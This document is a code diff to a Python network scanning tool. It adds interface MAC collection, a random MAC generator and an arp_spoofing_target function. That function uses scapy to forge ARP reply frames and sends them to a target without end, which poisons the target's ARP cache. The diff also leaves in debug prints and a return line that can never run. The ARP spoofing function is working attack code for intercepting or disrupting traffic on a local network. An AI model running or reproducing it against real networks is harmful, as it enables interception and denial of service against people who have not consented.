@@ -17,7 +17,7 @@ def network_scan(network_ip, netmask='24', iface=None, scan_type='quick_scan', t
         table_shown: Boolean - Returns a tuple (ip, mac, ports, os) that can be shown in a table
     """
 
-    arguments = "-sn"
+    arguments = f"-sn --exclude {state.current_interface_object['host_ip']}"
     if scan_type not in scan_types.values():
         return False, f"Invalid scan type: {scan_type}"
     
@@ -107,18 +107,24 @@ def get_interfaces():
     brief_interfaces = []
 
     for iface, addrs in psutil.net_if_addrs().items():
+            mac_address = ''
             for addr in addrs:
+                if addr.family == psutil.AF_LINK:
+                    mac_address = addr.address
+
                 if addr.family.name == 'AF_INET':
                     network = ipaddress.IPv4Network(f"{addr.address}/{addr.netmask}", strict=False)
 
                     interface_parsed_obj = {
                         "interface": iface,
+                        "interface_name": iface,
                         'interface_with_ip': f"{iface} ({addr.address})",
                         'network_ip': network.network_address,
                         'host_ip': addr.address,
                         'netmask': network.netmask,
                         'netprefix': network.prefixlen,
                         'formatted': network,
+                        "mac": mac_address
                     }
                     if state.client_details['os'] == "Windows":
                         # import library for windows
@@ -132,3 +138,43 @@ def get_interfaces():
                     brief_interfaces.append(f"{iface} ({addr.address})")
 
     return interfaces, brief_interfaces
+
+def generate_MAC():
+    hex_digits = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
+    return ":".join(f"{choice(hex_digits)}{choice(hex_digits)}" for _ in range(6))
+
+def arp_spoofing_target(host_tupl, target_tupl, randomise_mac=False):
+
+    # initial values
+    host_ip = host_tupl[0]
+    host_mac = host_tupl[1]
+    network_ip = state.current_interface_object['network_ip']
+
+    target_ip = target_tupl[0]
+    target_mac = target_tupl[1]
+
+    if target_ip == host_ip:
+        return False, "Host and target cannot be the same"
+    
+    if host_tupl[0] == 'host':
+        host_ip = state.current_interface_object['host_ip']
+        host_mac = state.current_interface_object['mac']
+    
+    if randomise_mac:
+        host_mac = generate_MAC()
+
+    print("Aici in jos")
+    print(host_ip, host_mac)
+    print(target_ip, target_mac)
+    print(network_ip)
+
+    # craft packet
+    eth_l2 = Ether(src=host_mac, dst=target_mac)
+    arp = ARP(op=2, pdst=target_ip, psrc=host_ip, hwdst=target_mac)
+    frame = eth_l2 / arp
+
+    while True:
+        sendp(frame, iface=state.current_interface_object['interface_name'])
+        time.sleep(.2)
+
+    return True, "Spoofing.."
